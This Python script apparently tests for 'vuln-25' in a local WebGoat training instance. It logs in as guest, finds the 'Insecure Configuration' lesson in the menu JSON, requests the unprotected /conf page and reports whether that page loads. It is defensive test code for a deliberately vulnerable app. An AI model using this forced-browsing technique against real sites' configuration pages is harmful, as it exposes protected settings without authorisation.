import requests, json

urlLogin = "http://127.0.0.1:8080/WebGoat/login.mvc"
urlRealLogin = "http://127.0.0.1:8080/WebGoat/j_spring_security_check"
urlStart = "http://127.0.0.1:8080/WebGoat/start.mvc"
urlJSON = "http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc"

urlRandomMenu = "http://127.0.0.1:8080/WebGoat/attack?Screen=32&menu=5"

username = 'guest'
password = 'guest'

#This isn't really needed since we are using the session feature in the requests library
#req = requests.get(urlLogin)
#session_1_cookie = req.cookies['JSESSIONID']

#logs into webgoat and stores session cookie for later use
s = requests.Session()
data = {'username':'guest', 'password':'guest'}
r = s.post(urlRealLogin, data=data)
session_2_cookie = s.cookies['JSESSIONID']


#retrieves json data for dynamic menu and parses it for our vulnerability
r = s.get(urlJSON)

json = json.loads(r.text)

found = False
current_menu_location = ""
count = 0;

for menu_item in json:
	for item in menu_item:
		if(item == "name"):
			if(json[count][item] == "Insecure Configuration"):
				current_menu_location = json[count]["children"][0]["link"]
				found = True
				break
	if(found):
		break
	count = count + 1

vulnUrl = "http://127.0.0.1:8080/WebGoat/attack" + current_menu_location[6:]
configURL = "http://127.0.0.1:8080/WebGoat/conf" + current_menu_location[6:]

#loads the vulnerable page
r = s.get(vulnUrl)

#executes vulnerability
r = s.get(configURL)

#if the result of executing the vulnerability is the 
#configuration page, exit with value 1 (attack successful)
#else exit with value 0 (vulnerability is fixed/not present)
if ("Welcome to WebGoat Configuration Page" in r.text):
	print "vuln-25 present"
	#exit(1)
else:
	print "vuln-25 not present"
	#exit(0)




